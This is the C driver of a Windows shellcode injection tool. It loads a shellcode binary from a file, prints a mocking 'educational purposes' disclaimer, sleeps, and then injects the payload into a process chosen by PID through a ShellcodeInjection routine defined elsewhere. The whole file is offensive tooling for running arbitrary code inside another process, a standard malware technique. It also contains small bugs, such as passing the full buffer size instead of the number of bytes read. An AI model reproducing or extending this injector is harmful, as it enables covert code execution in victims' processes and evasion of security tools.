#pragma once

#include <stdio.h>
#include <Windows.h>
#include "injection.h"

//-----------------------------------------------------------------------------------------------------

#pragma region vars

size_t sizeOfShellcode = NULL;
unsigned char shellcode[MAX_SHELLCODE_SIZE];

#pragma endregion

//------------------------------------------------------------------------------------------------------

#pragma region readFromFile

/* This function will save the shellcode and the size of shellcode into variables if executed successfully. The functions returns TURE (0) on successfull execution. Don't expect it to execute successfully tho */
BOOL LoadShellcodeFromFile(const char* filename) { // size_t is basically an unsigned 64bit integer
	FILE* pFile;
	fopen_s(&pFile, filename, "rb");
	if (pFile == NULL) {
		yapBad("Failed to open file: %s", filename);
		return FALSE; 
	}

	/*
	@breif - Fread is used to read contents of a file pointer and return the size of the file and the save the contents of the file to a pointer to the buffer.
	@param1 - Pointer to save the contents read from the file
	@param2 - Size of each element to read
	@param3 - Max elements it can read
	@param4 - Pointer to the file
	*/
	sizeOfShellcode = fread(shellcode, 1, MAX_SHELLCODE_SIZE, pFile);
	if (sizeOfShellcode == 0) {
		yapBad("Failed to read shellcode from file or file is empty");
		fclose(pFile);
		return FALSE;
	}

	fclose(pFile);
	return TRUE;
}

#pragma endregion 

//------------------------------------------------------------------------------------------------------

void banner(void) {
	printf("\n\nDISCLAIMER: This code is for educational purposes only... because who doesn't want to learn how to print things, right? \n");
	printf("If you decide to use this for any malicious activities, well... congratulations, you're officially on the wrong side of history. \n");
	printf("But seriously, please don't. We don't need any more 'hackers' who think running random scripts makes them a legend. \n\n");
}

//------------------------------------------------------------------------------------------------------
int main(int argc, char* argv[]) {
	if (argc != 3) {
		yapBad("Usage: %s [PID] [SHELLCOED.BIN], Error: %ld", argv[0], GetLastError());
		return EXIT_FAILURE;
	}

    LoadShellcodeFromFile(argv[2]);

	banner();
	Sleep(10000);

	if (!ShellcodeInjection(atoi(argv[1]), shellcode, sizeof(shellcode))) {
		yapBad("Shellcode Injection Failed. Error code: (%ld)", GetLastError());
		return EXIT_FAILURE;
	}

	yapOkay("Shellcode injection sucessfull");

	return EXIT_SUCCESS; // EXIT_SUCCESS just returns 0, I just like to make things looks complicated ;)
}
